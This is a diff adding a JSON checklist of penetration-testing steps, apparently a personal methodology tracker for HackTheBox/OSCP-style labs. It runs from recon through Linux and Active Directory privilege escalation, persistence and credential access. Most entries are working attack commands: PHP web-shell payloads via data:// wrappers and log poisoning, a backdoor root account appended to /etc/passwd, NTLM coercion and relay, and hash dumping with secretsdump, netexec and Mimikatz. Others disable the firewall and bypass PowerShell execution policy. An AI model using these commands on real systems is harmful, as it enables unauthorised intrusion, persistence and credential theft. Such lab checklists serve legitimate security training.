@@ -1,0 +1,849 @@
+[
+    {
+        "step":  "Run Autorecon",
+        "phase":  "Recon",
+        "notes":  "autorecon 192.168.133.12 --nmap-append=\"--min-rate=20000\" --exclude-tags dirbuster",
+        "references":  "sudo nmap -Pn -n 192.168.200.65 -sC -sV -p- --open",
+        "done":  false
+    },
+    {
+        "step":  "Zone Transfer",
+        "phase":  "Recon",
+        "notes":  "dig axfr @10.10.10.83 ctfolympus.htb",
+        "references":  "knock -v 10.10.10.83 3456 8234 62431",
+        "done":  false
+    },
+    {
+        "step":  "Nmap Full TCP Scan",
+        "phase":  "Recon",
+        "notes":  "nmap -p- -sCV -A -Pn \u003cip addr\u003e —min-rate=20000",
+        "references":  "SCAN ALL PORTS Try fingerprint -nvv or connect to port sometimes with nc and see what it returns",
+        "done":  false
+    },
+    {
+        "step":  "Nmap UDP Scan",
+        "phase":  "Recon",
+        "notes":  "Run against discovered subdomains aswell",
+        "references":  "Tools → Nmap",
+        "done":  false
+    },
+    {
+        "step":  "Directory Brute Force",
+        "phase":  "Recon",
+        "notes":  "Ask yourself why the 302 directory was found if found, scan for Default directories related to service manually",
+        "references":  "Tools → Feroxbuster",
+        "done":  false
+    },
+    {
+        "step":  "Gobuster Directory Scan",
+        "phase":  "Recon",
+        "notes":  "Sometimes using a different buster exposes more endpoints",
+        "references":  "Tools → Gobuster",
+        "done":  false
+    },
+    {
+        "step":  "Run Nikto on HTTP",
+        "phase":  "Recon",
+        "notes":  "nikto -h \u003cIP\u003e",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Page Source and Response Header",
+        "phase":  "Recon",
+        "notes":  "Ctrl U + Check JS files",
+        "references":  "Ports → Port 80",
+        "done":  false
+    },
+    {
+        "step":  "Subdomain Enumeration",
+        "phase":  "Recon",
+        "notes":  "wfuzz -u http://\u003cIP\u003e -H \"Host: FUZZ.domain.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+        "references":  "Tools → Wfuzz",
+        "done":  false
+    },
+    {
+        "step":  "Check robots.txt",
+        "phase":  "Recon",
+        "notes":  "/robots.txt",
+        "references":  "Ports → Port 80",
+        "done":  false
+    },
+    {
+        "step":  "Check README",
+        "phase":  "Recon",
+        "notes":  "/README.txt",
+        "references":  "Ports → Port 80",
+        "done":  false
+    },
+    {
+        "step":  "Analyze every request with Burp",
+        "phase":  "Recon",
+        "notes":  "Test every function of the site, for LFI,Sqli,IDOR,Mass Assignment,Business Logic",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "If LFI, File Read or Path Traversal",
+        "phase":  "Recon",
+        "notes":  "Look for a user and try to grab the .ssh file in the /home/remi/.ssh directory",
+        "references":  "https://pwnbase.org/helpers/file-read also fuzz for parameters with wfuzz file.php?FUZZ=../../../../etc/passwd check for RFI nd ssh after check /etc/shadow /proc/self/environ /var/log/apache2/access.log /var/log/auth.log —\u003e ssh poison \u0026 cmd=id nc -nv $IP 22 omgthisiss/\u003c?php passthru($_GET[’cmd’]); ?\u003e",
+        "done":  false
+    },
+    {
+        "step":  "TLS/SSL Certificates",
+        "phase":  "Recon",
+        "notes":  "openssl s_client -connect \u003cIP\u003e:\u003cPORT\u003e",
+        "references":  "Good for grabbing usernames",
+        "done":  false
+    },
+    {
+        "step":  "DNS Enumeration",
+        "phase":  "Recon",
+        "notes":  "nslookup ; dig",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "CVE Enum",
+        "phase":  "Recon",
+        "notes":  "1- searchsploit (easier than exploit-db web interface but keep it updated) and double check rapid 7 2-SPLOITUS 3- Github search (sign in and use github search for the cve name or a part of the POC from searchsploit and you will find all repos that used that part, don\u0027t google dork it) 4- CVEdetails",
+        "references":  "https://www.cvedetails.com/, offesec discord",
+        "done":  false
+    },
+    {
+        "step":  "Check for version number leaks",
+        "phase":  "Recon",
+        "notes":  "Try checking error pages to see if you can catch the service version of the framework",
+        "references":  "Also google the error",
+        "done":  false
+    },
+    {
+        "step":  "Check for vulnerabiilities on certain components",
+        "phase":  "Recon",
+        "notes":  "Try googling the kit or package or something that the website uses and look if that has a vuln",
+        "references":  "If you get stuck",
+        "done":  false
+    },
+    {
+        "step":  "Map out how the website works",
+        "phase":  "Recon",
+        "notes":  "Try figuring out what the website is doing, AND PLUGINS",
+        "references":  "if you get stuck",
+        "done":  false
+    },
+    {
+        "step":  "Fuzz Parameters",
+        "phase":  "Recon",
+        "notes":  "Fuzz Parameters and check for LFI",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Custom Wordlist",
+        "phase":  "Recon",
+        "notes":  "cewl \u003chttp://192.168.213.180:80/\u003e | grep -v CeWL \u003e wordlist.txt",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Use php wrapper",
+        "phase":  "Recon",
+        "notes":  "php://filter for including the contents and data:// (https://www.php.net/manual/en/filesystem.configuration.php setting needs to be enabled. ) for code exec curl \"http://mountaindesserts.com/meteor/index.php?page=data://text/plain,%3C?php%20echo%20system(%27ls%27);?\u003e\" echo -n \u0027\u003c?php echo system($_GET[\"cmd\"]);?\u003e\u0027 | base64 curl \"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==\u0026cmd=ls\"",
+        "references":  "if on curling the webpage, some part is missing then try this",
+        "done":  false
+    },
+    {
+        "step":  "Check Virtual Hosts",
+        "phase":  "Enumeration",
+        "notes":  "ls /etc/nginx/sites-enabled ; ls /etc/apache2/sites-enabled",
+        "references":  "Check if these 2 are enabled, they might give us another subdomain",
+        "done":  false
+    },
+    {
+        "step":  "Enumerate Listening Ports",
+        "phase":  "Enumeration",
+        "notes":  "netstat -tulnp",
+        "references":  "PrivEsc → Network \u0026 Pivoting",
+        "done":  false
+    },
+    {
+        "step":  "Check Running Processes",
+        "phase":  "Enumeration",
+        "notes":  "ps -ef —forest",
+        "references":  "PrivEsc → Network \u0026 Pivoting",
+        "done":  false
+    },
+    {
+        "step":  "Check Active Services",
+        "phase":  "Enumeration",
+        "notes":  "ss -lntp, ps aux | grep -i root | grep 8080 netstat -ano or url each curl -I http://127.0.0.1:7999/ nc -nv 127.0.0.1 3306 nmap -sV -sC 127.0.0.1 -p 1935,7999,3306,8888,8765,9081,33060,8554 grep -R \"7999\\|8888\\|8765\\|9081\\|8554\\|1935\" /etc 2\u003e/dev/nullgrep -R \"3306\\|mysql\" /etc 2\u003e/dev/null",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Installed Packages and Software",
+        "phase":  "Enumeration",
+        "notes":  "pip3 list, check Program Data or check /etc or Recyclebin sometimes in quotes",
+        "references":  "PrivEsc → Writeable Locations",
+        "done":  false
+    },
+    {
+        "step":  "Examine Binary content \u0026 check metadata",
+        "phase":  "Enumeration",
+        "notes":  "Sometimes a weird binary is there w hardcoded password",
+        "references":  "Check metada of any file u come across",
+        "done":  false
+    },
+    {
+        "step":  "Reuse the passwords and usernames",
+        "phase":  "Enumeration",
+        "notes":  "Reuse pass and user everywhere",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check if python is running",
+        "phase":  "Enumeration",
+        "notes":  "python -V 2\u003e\u00261 python3 -V 2\u003e\u00261",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Process Enumeration",
+        "phase":  "Enumeration",
+        "notes":  "/proc/self/environ check this file to see whats running",
+        "references":  "useful if LFi",
+        "done":  false
+    },
+    {
+        "step":  "Identify Framework",
+        "phase":  "Enumeration",
+        "notes":  "Check for more endpoints or any debugging endpoint related to framework",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Root Directories",
+        "phase":  "Enumeration",
+        "notes":  "Manual check /var/www /home /root",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Absolute vs Relative Paths",
+        "phase":  "Enumeration",
+        "notes":  "look for quotes",
+        "references":  "Manual review, Unquoted Service Paths (https://www.notion.so/Unquoted-Service-Paths-30b1adde3d1780a389daf98304afccef?pvs=21)",
+        "done":  false
+    },
+    {
+        "step":  "SMB Enumeration",
+        "phase":  "Enumeration",
+        "notes":  "‘’smbclient -L //\u003cIP\u003e -N",
+        "references":  "check for null auth with netexec -u any -p",
+        "done":  false
+    },
+    {
+        "step":  "LDAP Enumeration",
+        "phase":  "Enumeration",
+        "notes":  "ldapsearch -x -h \u003cIP\u003e",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Config files \u0026 ENV",
+        "phase":  "Enumeration",
+        "notes":  "grep -R \"pass\" /usr/share/zoneminder 2\u003e/dev/null, env",
+        "references":  "check for env variables aswell within the config",
+        "done":  false
+    },
+    {
+        "step":  "Check Program Files",
+        "phase":  "Enumeration",
+        "notes":  "Look for 3rd Party Applications and .ini files",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check for Database config",
+        "phase":  "Enumeration",
+        "notes":  "htdocs/conf/conf.php, also salts C:\\xampp\\htdocs\\blog\\boot\\defines.php and hashing algo C:\\xampp\\htdocs\\blog\\engine\\Security.php",
+        "references":  "Figure out where the crm stores their db creds, or any config file",
+        "done":  false
+    },
+    {
+        "step":  "Check who can ssh",
+        "phase":  "Enumeration",
+        "notes":  "/etc/ssh/sshd_config",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check if you ae using a blocked port",
+        "phase":  "Enumeration",
+        "notes":  "Sometimes there are firewalls in place, youi have to bypass by using a diff port",
+        "references":  "check busybox and use standard service ones or use the open ports",
+        "done":  false
+    },
+    {
+        "step":  "Easy Quick Grab",
+        "phase":  "PrivEsc",
+        "notes":  "sudo -l nd check env",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Check for Listening Ports",
+        "phase":  "PrivEsc",
+        "notes":  "netstat -ano",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check For Writeable Files",
+        "phase":  "PrivEsc",
+        "notes":  "Check LinPEAS output for writeable files",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check for alias",
+        "phase":  "PrivEsc",
+        "notes":  "idk just check ‘alias’ , /proc/self/cmdline, enumerate by user",
+        "references":  "https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes",
+        "done":  true
+    },
+    {
+        "step":  "Check .bashhistory",
+        "phase":  "PrivEsc",
+        "notes":  "Check .bashhistory in users directory",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Look for root ssh key",
+        "phase":  "PrivEsc",
+        "notes":  "if root key is present under keys then simply ssh -i root root@127.0.0.1",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Analyze Root Processes",
+        "phase":  "PrivEsc",
+        "notes":  "ps aux | grep root",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check network traffic",
+        "phase":  "PrivEsc",
+        "notes":  "tcpdump -i lo -A, sudo tcpdump -i tun0 sudo tcpdump -i lo -A | grep \"pass”",
+        "references":  "Check for credentials getting leaked",
+        "done":  false
+    },
+    {
+        "step":  "Check Suid",
+        "phase":  "PrivEsc",
+        "notes":  "find / -perm -4000 2\u003e/dev/null",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check capabilities",
+        "phase":  "PrivEsc",
+        "notes":  "/usr/sbin/getcap -r / 2\u003e/dev/null",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Writable Files",
+        "phase":  "PrivEsc",
+        "notes":  "find / -type f -writable -user www-data 2\u003e/dev/null",
+        "references":  "find / -writable -type d 2\u003e/dev/null | grep -vE \u0027^/(proc|sys|run)\u0027",
+        "done":  false
+    },
+    {
+        "step":  "PATH Hijacking Check",
+        "phase":  "PrivEsc",
+        "notes":  "strings \u003cbinary\u003e ; ltrace \u003cbinary\u003e",
+        "references":  "Analyze any binary you come across",
+        "done":  false
+    },
+    {
+        "step":  "Analyze Binary Execution",
+        "phase":  "PrivEsc",
+        "notes":  "ltrace \u003cbinary\u003e",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Run Linpeas",
+        "phase":  "PrivEsc",
+        "notes":  "Go Slow, look at crons, look at suids, look at users, look at site conifg, look at proccess, look at unusual files, look at ports",
+        "references":  "System Timers, check each crons contents",
+        "done":  false
+    },
+    {
+        "step":  "Run LSE.sh",
+        "phase":  "PrivEsc",
+        "notes":  "with level 1",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "CronJob",
+        "phase":  "PrivEsc",
+        "notes":  "If you see a cronjob run pspy and check each dire",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check For password",
+        "phase":  "PrivEsc",
+        "notes":  "grep -r password /var/lib/openfire",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Finding a file",
+        "phase":  "PrivEsc",
+        "notes":  "sudo find / -name \"local.txt\"",
+        "references":  "sudo find / -name \"local.txt\" -exec cat {} \\; 2\u003e/dev/null",
+        "done":  false
+    },
+    {
+        "step":  "Check firewall port rules",
+        "phase":  "PrivEsc",
+        "notes":  "cat /etc/iptables/rules.v4",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check for other drives",
+        "phase":  "PrivEsc",
+        "notes":  "https://linux.die.net/man/8/lsblk",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "SQLi enumeration",
+        "phase":  "Exploitation",
+        "notes":  "pwnbase",
+        "references":  "https://pwnbase.org/tools",
+        "done":  false
+    },
+    {
+        "step":  "Add SSH Persistence",
+        "phase":  "Persistence",
+        "notes":  "mkdir ~/.ssh ssh-keygen rename http://key.pub to authorized_keys and upload into /home/user/.ssh/ ssh user@\u003cip addr\u003e -i id_rsa",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "/etc/passwd Persistence",
+        "phase":  "Persistence",
+        "notes":  "openssl passwd w00t echo \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" \u003e\u003e /etc/passwd su root2",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Find usernames",
+        "phase":  "AD-Enumeration",
+        "notes":  "rid brute if users dont work, net user /domain",
+        "references":  "If you get access look for usernames with stuff like netexec —rid-brute, —users, kerbrute",
+        "done":  false
+    },
+    {
+        "step":  "Check your environment w PowerView",
+        "phase":  "AD-Enumeration",
+        "notes":  "List out ur environment with powerview refer to tools page",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check RDP Access (3389)",
+        "phase":  "AD-Enumeration",
+        "notes":  "nmap -p 3389 \u003cIP\u003e",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "BloodHound",
+        "phase":  "AD-Enumeration",
+        "notes":  "Check spn of users, if ever fails then bloodyAD -d pirate.htb -u pentest -p \u0027p3nt3st2025!\u0027 \\--host dc01.pirate.htb get writable bloodhound-python -u \u003cuser\u003e -p \u003cpass\u003e -dc \u003cIP\u003e -d \u003cdomain\u003e -c all, MATCH p = (c:Computer)-[:HasSession]-\u003e(m:User) RETURN p MATCH (m:Computer) RETURN m",
+        "references":  "Check for outbound objectcontrol for each owner u own",
+        "done":  false
+    },
+    {
+        "step":  "LAPS Check",
+        "phase":  "AD-Enumeration",
+        "notes":  "Check for LAPS passwords",
+        "references":  "C:\\ProgramFiles\\LAPS",
+        "done":  false
+    },
+    {
+        "step":  "Check Privileges",
+        "phase":  "AD-Enumeration",
+        "notes":  "whoami /groups",
+        "references":  "whoami /priv",
+        "done":  false
+    },
+    {
+        "step":  "Check if Defender Active",
+        "phase":  "AD-Enumeration",
+        "notes":  "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" ; sc query WinDefend ; Get-MpComputerStatus",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check AppLocker Policies",
+        "phase":  "AD-Enumeration",
+        "notes":  "Get-AppLockerPolicy -Effective",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Certify \u0026 Vuln",
+        "phase":  "AD-Enumeration",
+        "notes":  "Invoke-WebRequest http://\u003cIP\u003e:8081/Invoke-Certify.ps1 -OutFile Certify.ps1 ; powershell -ep bypass -c \".\\Certify.ps1; Invoke-Certify find /vulnerable\" certipy find -u j.fleischman@fluffy.htb -p \u0027J0elTHEM4n1990!\u0027 -vulnerable -stdout",
+        "references":  "check with nxc -M adcs",
+        "done":  false
+    },
+    {
+        "step":  "Check for NTLMv2",
+        "phase":  "AD-Enumeration",
+        "notes":  "use responder to catch, check if we can connect back thru the smb",
+        "references":  "if we cant crack it then relay it",
+        "done":  false
+    },
+    {
+        "step":  "NTLMrelay ( Check if local admin has a session )",
+        "phase":  "AD-Enumeration",
+        "notes":  "python3 http://petitpotam.py/ 10.10.14.5 10.129.231.186, nxc -M ldap-checker, nxc smb \u003cTargetIP\u003e -u \u0027username\u0027 -p \u0027password\u0027 -M coerce_plus",
+        "references":  "if either smb or ldap signing is diabled",
+        "done":  false
+    },
+    {
+        "step":  "Run enum4linux",
+        "phase":  "AD-Enumeration",
+        "notes":  "enum4linux $target | tee enum4linuxng.log",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check for possible subdomains",
+        "phase":  "AD-Enumeration",
+        "notes":  "dnsrecon -d ‘EGOTISTICAL-BANK.LOCAL’ -n $target",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Authenticate with everypossible protocol",
+        "phase":  "AD-Enumeration",
+        "notes":  "try -k or —local-auth if its treating as domain user --generate-krb5-file krb5.conf sudo cp krb5.conf /etc/krb5.conf kinit f.frizzle ssh -k f.frizzle@frizzdc.frizz.htb",
+        "references":  "LOCAL AUTH LOCAL AUTH",
+        "done":  false
+    },
+    {
+        "step":  "Test for kerberoasting",
+        "phase":  "AD-Enumeration",
+        "notes":  "",
+        "references":  "Need username and password",
+        "done":  false
+    },
+    {
+        "step":  "Test for ASEP roasting",
+        "phase":  "AD-Enumeration",
+        "notes":  "kerbrute userenum usernames —dc $target -d fusion.corp",
+        "references":  "with username list after kerbrute",
+        "done":  false
+    },
+    {
+        "step":  "Check LDAP,RPC,SMB with anon access and Check for Public shares",
+        "phase":  "AD-Enumeration",
+        "notes":  "Check for Public shares, Recheck shares for every new user",
+        "references":  "netexec smb $target -u -p ‘’",
+        "done":  false
+    },
+    {
+        "step":  "Scan All TCP Ports \u0026 UDP",
+        "phase":  "AD-Enumeration",
+        "notes":  "",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "LDAPSEARCh check info field for exposed creds",
+        "phase":  "AD-Enumeration",
+        "notes":  "nmap -n -sV —script “ldap* and not brute” -p 389 $target",
+        "references":  "Apache Directory",
+        "done":  false
+    },
+    {
+        "step":  "Check SYSVOL",
+        "phase":  "AD-Enumeration",
+        "notes":  "",
+        "references":  "smb, maybe somthing useful in the scripts",
+        "done":  false
+    },
+    {
+        "step":  "RID brute after SMB",
+        "phase":  "AD-Enumeration",
+        "notes":  "username enum helps w it",
+        "references":  "crackmapexec smb $target -u enterprise-core-vn -p \u0027lalala\u0027 --rid-brute",
+        "done":  false
+    },
+    {
+        "step":  "Check if you can put stuff",
+        "phase":  "AD-Enumeration",
+        "notes":  "https://github.com/Greenwolf/ntlm_theft",
+        "references":  "Check if u can upload to smb or put to ftp webroot or grab hash with ntlmrely",
+        "done":  false
+    },
+    {
+        "step":  "Bruteforce different protocols",
+        "phase":  "AD-Enumeration",
+        "notes":  "Also check if username same as password lower nd upper",
+        "references":  "Everytime u get a new cred dont forget",
+        "done":  false
+    },
+    {
+        "step":  "Check Powershell history",
+        "phase":  "AD-PrivEsc",
+        "notes":  "PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\u003e ls",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check All installed Applications",
+        "phase":  "AD-PrivEsc",
+        "notes":  "first Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname then Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname",
+        "references":  "Check for 32 and 64bit Program files and Downloads directory as well",
+        "done":  true
+    },
+    {
+        "step":  "Check running Processes and Services",
+        "phase":  "AD-PrivEsc",
+        "notes":  "Get-Process, Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \u0027Running\u0027} and then use icacls to check perms Check its startmode Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like \u0027mysql\u0027}",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check for Quoted and Unquoted",
+        "phase":  "AD-PrivEsc",
+        "notes":  "wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"”",
+        "references":  "then Start-Service GammaService and stop",
+        "done":  false
+    },
+    {
+        "step":  "Check for Scheduled tasks",
+        "phase":  "AD-PrivEsc",
+        "notes":  "schtasks /query /fo LIST /v Get-ScheduledTask | where {$_.TaskPath -notlike “\\Microsoft*”} | ft TaskName,TaskPath,State",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Check for strange exe and if binded to service",
+        "phase":  "AD-PrivEsc",
+        "notes":  "Get-Service | findstr /i audit sc query | findstr /i \"audit\"",
+        "references":  "Is it:- a service?- a scheduled task?- startup program?",
+        "done":  false
+    },
+    {
+        "step":  "Check for config files",
+        "phase":  "AD-PrivEsc",
+        "notes":  "Get-ChildItem -Path C:\\users\\ -include 8.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.rar,*.zip,*.7z -File -Recurse -ErrorAction SilentlyContinue Kdbx file in C Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue Config files in xampp folder Get-ChildItem -Path C:\\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue Config files in ho Get-ChildItem -Path C:\\Users\\dave\\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Bloodhound",
+        "phase":  "AD-PrivEsc",
+        "notes":  "-just-dc-ntlm",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "WInpeas",
+        "phase":  "AD-PrivEsc",
+        "notes":  "Check hostname also, run as admin again",
+        "references":  "Check your permissions and then powerup.ps1 and then winpeas",
+        "done":  true
+    },
+    {
+        "step":  "Windows exploit suggester",
+        "phase":  "AD-PrivEsc",
+        "notes":  "runnit local exploit suggester",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Dump hashes Remotely",
+        "phase":  "AD-PrivEsc",
+        "notes":  "netexec smb $target -u Admin -H nt part of the hash —ntds or — lsa",
+        "references":  "add user to admin group and then dump remotely, CAN ONLY DUMP NTDS ON DC",
+        "done":  false
+    },
+    {
+        "step":  "Run secretsdump",
+        "phase":  "AD-PrivEsc",
+        "notes":  "when u have domain admin",
+        "references":  "impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/whitehat:akdfjakfaklf@$target",
+        "done":  false
+    },
+    {
+        "step":  "Check for Administrator user",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "net user /domain",
+        "done":  false
+    },
+    {
+        "step":  "Check Listening ports",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Run PowerUp.ps1, privescheck.ps1 and then WINPEAS",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Run whomai/all",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "easy wins",
+        "done":  false
+    },
+    {
+        "step":  "Pivot Check",
+        "phase":  "AD-PrivEsc",
+        "notes":  "if you need to pivot then relay all tools to the jumpbox",
+        "references":  "Check for additional network adapters after you are infor i in {1..254}; do (ping -c 1 192.168.1.$i | grep \"bytes from\" \u0026); done nslookup WEB01.pirate.htb 10.129.3.153",
+        "done":  false
+    },
+    {
+        "step":  "Responder",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "Check if writeable share could be path to steal hashes with responder",
+        "done":  false
+    },
+    {
+        "step":  "Check task",
+        "phase":  "AD-PrivEsc",
+        "notes":  "tasklist /v",
+        "references":  "",
+        "done":  true
+    },
+    {
+        "step":  "Check interesting files",
+        "phase":  "AD-PrivEsc",
+        "notes":  "C:\\\u003efindstr /SIM /c:\"pass\" *.ini *.cfg *.xml",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Check Xamp",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "check C:\\\\xampp\\properties.ini and check /",
+        "done":  false
+    },
+    {
+        "step":  "Extra",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "Try staged payload with msfvenom and try powershell -ep bypass C:/lalal",
+        "done":  false
+    },
+    {
+        "step":  "Check for certificate based attacks",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "Certipy",
+        "done":  false
+    },
+    {
+        "step":  "Shell as new user",
+        "phase":  "AD-PrivEsc",
+        "notes":  "",
+        "references":  "Dump all hashes and collect them in a file",
+        "done":  false
+    },
+    {
+        "step":  "GPP ABUSE",
+        "phase":  "AD-PrivEsc",
+        "notes":  "dir \\\\\\\\\u003cdomain\u003e||SYSVOL||\u003cdomain\u003e\\\\Policies\\\\ /s /b | findstr cpassword",
+        "references":  "Check for cpassword in the sysvol",
+        "done":  false
+    },
+    {
+        "step":  "If all else fails then Kernel",
+        "phase":  "AD-PrivEsc",
+        "notes":  "systeminfo and then check for exploits, use this to check the patches Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Disable Defender (Admin)",
+        "phase":  "AD-Persistence",
+        "notes":  "",
+        "references":  "Disable if admin",
+        "done":  false
+    },
+    {
+        "step":  "Disable AMSI (Admin)",
+        "phase":  "AD-Persistence",
+        "notes":  "",
+        "references":  "Bypass if needed",
+        "done":  false
+    },
+    {
+        "step":  "Disable firewall",
+        "phase":  "AD-Persistence",
+        "notes":  "netsh advfirewall set allprofiles state off",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Enabling RDP",
+        "phase":  "AD-Persistence",
+        "notes":  "",
+        "references":  "netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable",
+        "done":  false
+    },
+    {
+        "step":  "Check Stored Credentials (Windows)",
+        "phase":  "Credential Access",
+        "notes":  "cmdkey /list",
+        "references":  "PrivEsc → Windows",
+        "done":  false
+    },
+    {
+        "step":  "Dump Hashes (SMB)",
+        "phase":  "Credential Access",
+        "notes":  "nxc smb \u003cIP\u003e -u \u003cuser\u003e -p \u003cpass\u003e --sam",
+        "references":  "Only works if user is pwned!",
+        "done":  false
+    },
+    {
+        "step":  "Run Mimikatz",
+        "phase":  "Credential Access",
+        "notes":  "sekurlsa::logonpasswords",
+        "references":  "",
+        "done":  false
+    },
+    {
+        "step":  "Grab Hashes",
+        "phase":  "Credential Access",
+        "notes":  "cat /etc/passwd",
+        "references":  "",
+        "done":  false
+    }
+]
